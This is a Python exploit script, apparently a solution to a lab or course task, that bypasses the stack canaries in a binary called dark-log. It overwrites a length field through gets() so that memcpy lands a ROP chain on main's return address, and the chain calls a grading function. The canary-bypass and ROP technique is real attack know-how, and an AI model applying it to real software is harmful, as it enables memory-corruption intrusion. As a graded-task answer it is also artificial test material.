#!/usr/bin/env python3
"""Task 4: bypass the stack canary in attack/dark-log.
dark-log's input() has this layout:
    struct log_frame {
        char expression[128];   // rbp - 0x120
        char logMsg[128];       // rbp - 0x0a0
        int  len;               // rbp - 0x020
        char pad[8];
    };
    gets(f.expression);
    memcpy(f.logMsg + f.len, f.expression, sizeof(f.expression));
`gets` can overwrite f.len (offset 256) but we stop before the canary
(offset 280).  Then memcpy uses the overwritten len as an offset.
Set len = 192 (0xc0):
    f.logMsg + 192 = (rbp - 0xa0) + 0xc0 = rbp + 0x20
                    = main's saved rbp
memcpy copies expression[0..127] to main's saved rbp / return address.
It starts after main's canary (at rbp + 0x18), so both canaries remain
unchanged and the checks pass.  main returns normally into our ROP chain.
ROP:
    0x4018a3 : pop rdi ; ret  (hidden in "41 5f c3")
    0x4018a4 : ret            (stack alignment)
    0x401677 : grade_eval
"""
import struct
import sys
def p64(value: int) -> bytes:
    return struct.pack("<Q", value)
def p32(value: int) -> bytes:
    return struct.pack("<I", value)
POP_RDI = 0x4018A3
RET = 0x4018A4
GRADE_EVAL = 0x401677
# This chain will be copied to main's saved rbp / return address.
chain = (
    p64(0)              # main's saved rbp
    + p64(POP_RDI)      # main's return address
    + p64(4)            # rdi = 4
    + p64(RET)          # align stack for printf
    + p64(GRADE_EVAL)   # grade_eval(4)
    + p64(0)            # no exit@plt in dark-log; crash after output
)
assert len(chain) <= 128
payload = (
    chain + b"B" * (128 - len(chain))  # expression[128]
    + b"C" * 128                       # logMsg[128]
    + p32(192)                         # f.len = 0xc0
)
assert len(payload) == 260
assert b"\n" not in payload
sys.stdout.buffer.write(payload)